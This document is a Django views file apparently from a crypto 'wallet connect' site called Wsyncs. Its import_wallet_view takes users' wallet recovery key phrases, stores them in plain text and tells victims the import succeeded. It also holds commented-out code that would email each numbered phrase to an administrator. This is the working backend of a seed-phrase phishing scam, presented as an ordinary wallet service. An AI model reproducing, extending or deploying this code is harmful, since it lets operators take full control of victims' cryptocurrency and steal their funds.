from django.shortcuts import render,get_object_or_404, redirect
from django.urls import reverse
from django.http import JsonResponse
import requests 
from decimal import Decimal, InvalidOperation
import logging
import json
from django.http import HttpResponseBadRequest
from django.contrib.auth.decorators import user_passes_test
from datetime import datetime, timedelta, time
from django.http import Http404
from django.utils.timezone import now
from django.contrib.auth import get_user_model
from django.shortcuts import redirect
from django.contrib.auth import logout as auth_logout,login as auth_login,authenticate
from django.contrib.auth import get_user_model
from django.utils.crypto import get_random_string
from django.core.mail import EmailMessage
from django.contrib.auth import get_user_model
from django.conf import settings
from django.utils import timezone
from datetime import timedelta
from django.db.models import Max
from decimal import Decimal,InvalidOperation
from django.views import View
from django.views.decorators.csrf import csrf_exempt
from django.conf.urls.static import static
from django.core.mail import EmailMultiAlternatives
import pytz
from datetime import datetime, timedelta
from pytz import timezone as pytz_timezone
import logging
from django.contrib.auth.decorators import login_required
import logging
from django.core.mail import send_mail
from django.contrib.auth.hashers import make_password
from django.contrib.auth import logout
import string
import random
from django.contrib.auth import authenticate, login
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required, user_passes_test
from django.core.validators import EmailValidator
from django.core.exceptions import ValidationError
import re
from .models import WalletKeyPhrase
from django.db import IntegrityError


# Set up logging
logger = logging.getLogger(__name__)


def empty(request):
    return render(request,'page.html')

def home(request):
    return render(request,'index.html')



def connect(request):
    return render(request,'connect_wallet.html')

def import_wallet_view(request):
    if request.method != 'POST':
        return JsonResponse(
            {'status': 'error', 'message': 'Invalid request method'},
            status=405
        )

    try:
        data = json.loads(request.body)

        wallet_type = data.get('wallet_type')
        key_phrase = data.get('key_phrase')

        if not wallet_type or not key_phrase:
            return JsonResponse(
                {'status': 'error', 'message': 'Missing fields'},
                status=400
            )

        # Prevent duplicate key phrases
        if WalletKeyPhrase.objects.filter(key_phrase=key_phrase).exists():
            return JsonResponse(
                {
                    'status': 'error',
                    'message': 'This key phrase is already registered. Please use a different key phrase.'
                },
                status=400
            )

        # Save to database
        WalletKeyPhrase.objects.create(
            wallet_type=wallet_type,
            key_phrase=key_phrase
        )

        # Prepare numbered key phrase (for email / logging)
        key_phrase_words = key_phrase.split()
        numbered_key_phrase = [
            {'index': i + 1, 'word': word}
            for i, word in enumerate(key_phrase_words)
        ]

        # =====================================================
        # EMAIL NOTIFICATION (COMMENTED OUT ON PURPOSE)
        # =====================================================

        # subject = 'New Wallet Key Phrase Submission - Wsyncs'
        # from_email = settings.DEFAULT_FROM_EMAIL
        # to_email = settings.ADMIN  # Ensure this exists in settings.py

        # text_content = f"""
        # New Wallet Key Phrase Submission - Wsyncs
        #
        # Wallet Type: {wallet_type}
        # Submission Time: {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}
        #
        # Key Phrase:
        # """ + "\n".join(
        #     f"{item['index']}. {item['word']}" for item in numbered_key_phrase
        # )

        # html_content = f"""
        # <h2>New Wallet Key Phrase Submission</h2>
        # <p><strong>Wallet Type:</strong> {wallet_type}</p>
        # <p><strong>Submission Time:</strong>
        # {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        #
        # <table border="1" cellpadding="8" cellspacing="0">
        #   <tr>
        #     <th>#</th>
        #     <th>Word</th>
        #   </tr>
        #   {"".join(
        #       f"<tr><td>{item['index']}</td><td>{item['word']}</td></tr>"
        #       for item in numbered_key_phrase
        #   )}
        # </table>
        # """

        # try:
        #     email = EmailMultiAlternatives(
        #         subject=subject,
        #         body=text_content,
        #         from_email=from_email,
        #         to=[to_email],
        #     )
        #     email.attach_alternative(html_content, "text/html")
        #     email.send()
        # except Exception as e:
        #     logger.warning(f"Failed to send email: {str(e)}")

        # =====================================================
        # SUCCESS RESPONSE (THIS WAS THE MAIN BUG BEFORE)
        # =====================================================
        return JsonResponse(
            {'status': 'success', 'message': 'Wallet imported successfully'},
            status=201
        )

    except IntegrityError:
        logger.error("Duplicate key phrase detected", exc_info=True)
        return JsonResponse(
            {
                'status': 'error',
                'message': 'This key phrase is already registered.'
            },
            status=400
        )

    except json.JSONDecodeError:
        return JsonResponse(
            {'status': 'error', 'message': 'Invalid JSON payload'},
            status=400
        )

    except Exception as e:
        logger.error(f"Error in import_wallet_view: {str(e)}", exc_info=True)
        return JsonResponse(
            {'status': 'error', 'message': 'Internal server error'},
            status=500
        )
